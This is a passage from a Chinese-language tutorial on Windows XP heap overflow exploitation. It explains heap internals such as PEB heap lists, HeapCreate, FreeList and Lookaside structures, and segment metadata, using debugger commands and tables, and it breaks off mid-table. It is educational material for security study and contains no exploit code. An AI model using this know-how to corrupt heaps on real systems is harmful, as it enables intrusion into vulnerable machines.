# Windows平台下的堆溢出利用技术（二）（上篇）

0x00 背景
-------

* * *

开头我讨论了在旧版本Windows下利用堆溢出的技术，试着给读者提供一些关于unlink过程是怎样执行的、以及freelist[n]里面的flink/blink是如何被攻击者控制并提供简单的任意“4字节写”操作 的 实用的知识。

本文的主要目的是重新提醒自己（我很健忘）并且帮助安全专家获取对老版本windows（NT v5 及以下）堆管理器如何工作 技术上的理解。本文完成的是利用堆溢出或者内存覆写漏洞 并且绕过特定的防止“4字节写”的混合措施。本文的目的还有让读者掌握基础的知识 其毫无疑问地在攻击新版本windows堆实现方式时被用到。

这个教程将会从细节上讨论一个并且仅讨论一个 为人熟知的针对特定程序绕过Windows XP SP2/SP3堆保护机制的技术。因此，这并不是一个完善的入门书，它也不会涉及到堆的每一个方面。

继续之前，需要对windows XP/Server 2003下堆的构造有比较全面地理解。为了本教程本身的目的，以及基于文章Heap Overflow for Humans 101的反馈，我将会讨论一些在当前环境 堆内部如何工作的话题。

如果在基础层面你对基于堆的缓冲区溢出不熟悉，那么建议你先把注意力放在这个地方。为了继续你需要：

```
•   Windows XP 仅安装SP1
•   Windows XP 仅安装SP2/SP3
•   一个调试器 (Olly Debugger, Immunity Debugger, windbg with access to the ms symbol server etc).
•   一个C/C++编译器 (Dev C++, lcc-32, MS visual C++ 6.0 (如果你还能找到它)).
•   随意一种脚本语言 （我用的python，也许你可以用perl）
•   A brain (and/or persistance).
•   一个大脑 （和/或 毅力）
•   一些汇编和C的知识，以及如何用调试器 调试的知识
•   OD的插件HideDbg或者 !hidedebug under immunity debugger
•   时间

```

拿杯咖啡然后我们一起来调查这种黑暗艺术。

所以到底什么是chunk和block？

Chunk是一种简单的用block衡量的连续内存 并且其特定的状态取决于特定的堆chunk header中flag的设定。Block是简单的一块8字节堆空间。一般地我们关心一个chunk是被分配过还是被free掉了。在本文中为了方便叙述，这些名词都会以这种含义使用。

不管怎么说，所有的chunk都存储在堆中。额外地，堆chunk也许会出现在堆结构的其他位置并且取决于其位置会有不同的chunk结构。

让我们通过讨论堆结构本身以及三个非常重要的堆中chunk存储结构开始吧。

0x01 堆的结构
---------

* * *

默认情况下，Windows有一个特定的结构供堆参考。在PEB中的0x90偏移，你可以看到 从堆创建位置起 以有序数组结构展现的 对应进程的堆列表 使用Windbg我们可以通过!peb命令找到目前的PEB。如果你是Immunity Debugger的用户，你也可以通过!peb命令观看这条信息，!peb提供的非常简单的代码如下所示：

```
from immlib import *
def main(args):
        imm = Debugger()
        peb_address = imm.getPEBAddress()
        info = 'PEB: 0x%08x' % peb_address
        return info

```

我们一进入PEB就能看到进程的堆信息：

```
+0x090 ProcessHeaps : 0x7c97ffe0 -> 0x00240000 Void 

```

所以让我们在这个地址0x7c97ffe0 dump DWORD（4字节）

```
0:000> dd 7c97ffe0 
7c97ffe0 00240000 00340000 00350000 003e0000 
7c97fff0 00480000 00000000 00000000 00000000 
7c980000 00000000 00000000 00000000 00000000 
7c980010 00000000 00000000 00000000 00000000 
7c980020 02c402c2 00020498 00000001 7c9b2000 
7c980030 7ffd2de6 00000000 00000005 00000001 
7c980040 fffff89c 00000000 003a0043 0057005c 
7c980050 004e0049 004f0044 00530057 0073005c 

```

加粗字体的地址就是目前在运行进程的堆。这条信息也可以在windbg和Immunity Debugger中通过使用!heap命令找到

![](http://drops.javaweb.org/uploads/images/f1290699e335cf565ccee4b3e6785c22de848708.jpg)

额外地，你可以通过windbg中的!heap –stat命令观看每个堆的静态信息。下面是示例回显：

```
_HEAP 00030000 
Segments 00000002 
Reserved bytes 00110000 
Committed bytes 00014000 
VirtAllocBlocks 00000000 
VirtAlloc bytes 00000000 

```

最终，你可以通过使用-h和-q标签dump一些堆的元数据

![](http://drops.javaweb.org/uploads/images/f791e04f2b5f61022457a7bf3fc695b44b3ac300.jpg)

第一个堆(0x00240000)是默认的堆，其他堆都是由C组件及构造方法创建的，而回显中最后的堆(0x00480000)是被我们的程序创建的。

程序可能会调用形如HeapCreate()的函数来创建额外的堆并且把指针存储在PEB中0x90偏移量中，下例展示了HeapCreate()的Windows API

```
HANDLE WINAPI HeapCreate(
 __in DWORD flOptions,
 __in SIZE_T dwInitialSize,
 __in SIZE_T dwMaximumSize
 );

```

一个带有正确参数的HeapCreate()调用将会返回一个存储在EAX寄存器中指向新创建的堆的指针

参数如下所示：

1.  flOptions
    
    • HEAP_CREATE_ENABLE_EXECUTE: 允许执行代码 • HEAP_GENERATE_EXCEPTIONS:当调用HeapAlloc() 或者 HeapReAlloc()时无法满足需求情况下抛出一个异常 • HEAP_NO_SERIALIZE:当堆函数访问堆时不使用序列化方式
    
2.  dwInitialSize
    

为堆分配的初始大小是最近的页表大小（4K）。如果指定为0，那么就给堆设置了一个单页大小。这个值必须比dwMaximumSize小

1.  dwMaximumSize

堆的最大大小。如果对HeapAlloc() 或者 HeapReAlloc()的请求超出了dwinitialSize的值，那么虚拟内存管理器将会返回 能够满足分配请求的内存页表 并且剩下的内存会被存储到freelist中

如果dwMaximumSize为0，堆大小能够自动增加。堆的大小只被可用内存限制

更多关于flag的信息可以查阅msdn。下面是一张重点区域高亮显示的堆结构表。你可以在windbg下使用命令'dt _heap'来查看此条信息。

<table border="0" style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><colgroup style="box-sizing: border-box;"><col style="box-sizing: border-box; width: 87px;"><col style="box-sizing: border-box; width: 87px;"><col style="box-sizing: border-box; width: 224px;"></colgroup><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-width: 0.75pt; border-style: outset; border-color: initial;"><p style="box-sizing: border-box; margin: 20px 0px;"><span style="box-sizing: border-box; color: white; font-family: 宋体; font-size: 12pt;"><strong style="box-sizing: border-box; font-weight: 700;">Address</strong></span></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><span style="box-sizing: border-box; color: white; font-family: 宋体; font-size: 12pt;"><strong style="box-sizing: border-box; font-weight: 700;">Value</strong></span></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><span style="box-sizing: border-box; color: white; font-family: 宋体; font-size: 12pt;"><strong style="box-sizing: border-box; font-weight: 700;">Description</strong></span></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Base Address&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0036000C&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000002&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flags&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360010&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">ForceFlags&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360014&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0000FE00&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">VirtualMemoryThreshold&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360050</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360050</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">VirtualAllocatedBlocks List</strong></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360158</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00000000</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">FreeList Bitmap</strong></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360178</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00361E90</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">FreeList[0]</strong></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360180</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360180</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">FreeList[n]</strong></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360578&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360608&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">HeapLockSection&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0036057C&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Commit Routine Pointer&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360580&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360688&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">FrontEndHeap&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360586&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000001</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">FrontEndHeapType&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00360678&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00361E88&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Last Free Chunk&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00360688</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">0x00000000</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Lookaside[n]</strong></p></td></tr></tbody></table>

0x02 堆 segments：
----------------

* * *

正如之前所提到的，每个堆chunk都被存储在堆segment里面。如果一块内存chunk被free了，它除了将会被加入freelist或者lookaside list之外还会被存储到堆segment里。当分配空间时，如果堆管理器在lookaside或者freelist里找不到任何的空闲chunk，它就会从未分配内存中提供更多的内存给当前的堆segment。如果大量内存被分配到很多地方，堆的结构可以拥有许多segment。下面显示的是segment chunk结构表：

<table border="0" style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><colgroup style="box-sizing: border-box;"><col style="box-sizing: border-box; width: 54px;"><col style="box-sizing: border-box; width: 92px;"><col style="box-sizing: border-box; width: 92px;"><col style="box-sizing: border-box; width: 117px;"><col style="box-sizing: border-box; width: 69px;"><col style="box-sizing: border-box; width: 81px;"><col style="box-sizing: border-box; width: 92px;"></colgroup><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-width: 0.75pt; border-style: outset; border-color: initial;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Header</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Self Size (0x2)</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Prev Size (0x2)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Segment index (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flag (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Unused (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Tag index (0x1)&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Data</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset;">&nbsp;</td></tr></tbody></table>

在分析堆segment时，我们可以通过在windbg中使用`'!heap -a [heap address]'`命令完成

![](http://drops.javaweb.org/uploads/images/a76543c11b86dabb491b8a351b0e6a478ed8b775.jpg)

额外地，你可以在immunity debugger中使用`'!heap -h [heap address] -c'(选项-c 显示chunk)`

![](http://drops.javaweb.org/uploads/images/3f0fdaa16334aa3418543ccaa7212e213fec710e.jpg)

每个segment在数据chunk后面包含了它自己的元数据。下面是segment分配的内存，并且最终这个segment包含了一个未分配内存的部分。现在我们清楚了我们想要分析的segment，我们可以使用命令`'dt _heap_segment [segment address]'`来dump元数据结构。

![](http://drops.javaweb.org/uploads/images/9b5c92c01c07720ae9e9d25a8494b9523821ca99.jpg)

下面是一个详细的元数据结构表单。为简单起见，我们将设定从地址0x00480000开始。

<table border="0" style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><colgroup style="box-sizing: border-box;"><col style="box-sizing: border-box; width: 86px;"><col style="box-sizing: border-box; width: 86px;"><col style="box-sizing: border-box; width: 198px;"></colgroup><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-width: 0.75pt; border-style: outset; border-color: initial;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Address</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Value</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Description</strong></p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480008&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0xffeeffee&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Signature&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0048000C&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000000</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flags&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480010&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Heap&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480014&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0003d000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">LargeUncommitedRange&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480018&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">BaseAddress&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0048001c&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000040&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">NumberOfPages&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480020&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480680&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">FirstEntry&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480024&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x004c0000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">LastValidEntry&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480028&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0000003d&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">NumberOfUncommitedPages</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x0048002c&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000001&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">NumberOfUncommitedRanges&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480030&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt 